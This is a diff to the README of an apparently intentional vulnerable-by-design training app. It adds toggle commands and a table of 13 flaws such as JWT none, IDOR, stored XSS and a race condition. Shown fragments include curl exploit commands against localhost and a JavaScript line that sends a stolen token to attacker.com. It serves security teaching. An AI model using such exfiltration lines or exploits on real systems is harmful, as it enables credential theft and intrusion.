@@ -2,18 +2,43 @@
 
 This application contains **13 intentional security vulnerabilities** for cybersecurity learning.
 
-## Quick Start
+## Toggle Vulnerabilities
+
+Each vulnerability can be toggled individually. The toggle script swaps source files between secure and vulnerable versions, then rebuilds the backend.
 
 ```bash
-make vulnerable    # Enable all backend vulnerabilities
-make secure        # Revert to secure code
+make list                  # Show all vulnerabilities with ON/OFF status
+make vulnerable 1 3 10     # Enable specific vulnerabilities by number
+make vulnerable all        # Enable all vulnerabilities
+make secure                # Disable all (restore secure code)
 ```
+
+### Vulnerability Map
+
+| #  | Vulnerability               | Difficulty | Files swapped                             |
+|----|------------------------------|------------|-------------------------------------------|
+| 1  | JWT none algorithm           | 🟢 Easy    | `middleware.go`                           |
+| 2  | IDOR on profile              | 🟢 Easy    | `handler_user.go`                         |
+| 3  | Negative amount transfer     | 🟢 Easy    | `handler_points.go`                       |
+| 4  | Mass assignment              | 🟡 Medium  | `handler_auth.go` + `repository_user.go`  |
+| 5  | User enumeration             | 🟢 Easy    | `handler_auth.go` + `repository_user.go`  |
+| 6  | Reset token leak             | 🟡 Medium  | `handler_auth.go` + `repository_user.go`  |
+| 7  | Stored XSS                   | 🟡 Medium  | `handler_auth.go` + `repository_user.go`  |
+| 8  | SSL pinning bypass           | 🔴 Hard    | `api_service.dart`                        |
+| 9  | Root detection bypass        | 🔴 Hard    | `main.dart`                               |
+| 10 | Race condition               | 🔴 Hard    | `repository_points.go`                    |
+| 11 | Deep link injection          | 🟡 Medium  | Always active (in AndroidManifest)        |
+| 12 | WebView JavaScript bridge    | 🔴 Hard    | Always active (Help page debug console)   |
+| 13 | Insecure local storage       | 🟢 Easy    | Always active (SharedPreferences)         |
+
+> **Note:** Vulns 4, 5, 6, 7 share the same source files — enabling any one enables all four.
+> Vulns 11, 12, 13 are always present in the client and don't require toggling.
 
 ---
 
 ## Backend Vulnerabilities
 
-### 1. JWT `none` Algorithm Bypass (A07)
+### 1. JWT `none` Algorithm Bypass
 
 **Difficulty:** 🟢 Easy
 
@@ -32,7 +57,7 @@ curl http://localhost:8443/api/profile -H "Authorization: Bearer $TOKEN"
 
 ---
 
-### 2. IDOR — View Any User's Profile (A01)
+### 2. IDOR — View Any User's Profile
 
 **Difficulty:** 🟢 Easy
 
@@ -47,7 +72,7 @@ curl http://localhost:8443/api/profile?id=2 \
 
 ---
 
-### 3. Negative Amount Transfer (A04)
+### 3. Negative Amount Transfer
 
 **Difficulty:** 🟢 Easy
 
@@ -63,7 +88,7 @@ curl -X POST http://localhost:8443/api/points/transfer \
 
 ---
 
-### 4. Mass Assignment — Register with Custom Points (A08)
+### 4. Mass Assignment — Register with Custom Points
 
 **Difficulty:** 🟡 Medium
 
@@ -78,7 +103,7 @@ curl -X POST http://localhost:8443/api/register \
 
 ---
 
-### 5. User Enumeration (A07)
+### 5. User Enumeration
 
 **Difficulty:** 🟢 Easy
 
@@ -94,7 +119,7 @@ curl -X POST http://localhost:8443/api/register \
 
 ---
 
-### 6. Reset Token Leaked in Response (A04)
+### 6. Reset Token Leaked in Response
 
 **Difficulty:** 🟡 Medium
 
@@ -113,7 +138,7 @@ curl -X POST http://localhost:8443/api/reset-password \
 
 ---
 
-### 7. Stored XSS via Fullname (A03)
+### 7. Stored XSS via Fullname
 
 **Difficulty:** 🟡 Medium
 
@@ -130,7 +155,7 @@ curl -X POST http://localhost:8443/api/register \
 
 ---
 
-### 10. Race Condition — Double Spend (A04)
+### 10. Race Condition — Double Spend
 
 **Difficulty:** 🔴 Hard
 
@@ -155,7 +180,7 @@ curl http://localhost:8443/api/points/balance -H "Authorization: Bearer $TOKEN"
 
 ## Android Client Vulnerabilities
 
-### 8. SSL Pinning Bypass (A07) — Toggleable
+### 8. SSL Pinning Bypass
 
 **Difficulty:** 🔴 Hard
 
@@ -169,7 +194,7 @@ curl http://localhost:8443/api/points/balance -H "Authorization: Bearer $TOKEN"
 
 ---
 
-### 9. Root Detection Bypass (M8) — Toggleable
+### 9. Root Detection Bypass
 
 **Difficulty:** 🔴 Hard
 
@@ -182,7 +207,7 @@ When secure mode is active, practice bypassing with:
 
 ---
 
-### 11. Deep Link Intent Injection (M1)
+### 11. Deep Link Intent Injection
 
 **Difficulty:** 🟡 Medium
 
@@ -202,7 +227,7 @@ adb shell am start -a android.intent.action.VIEW \
 
 ---
 
-### 12. WebView JavaScript Bridge (M1)
+### 12. WebView JavaScript Bridge
 
 **Difficulty:** 🔴 Hard
 
@@ -218,7 +243,7 @@ fetch('https://attacker.com/steal?token=' + token);
 
 ---
 
-### 13. Insecure Local Storage (M9)
+### 13. Insecure Local Storage
 
 **Difficulty:** 🟢 Easy
 
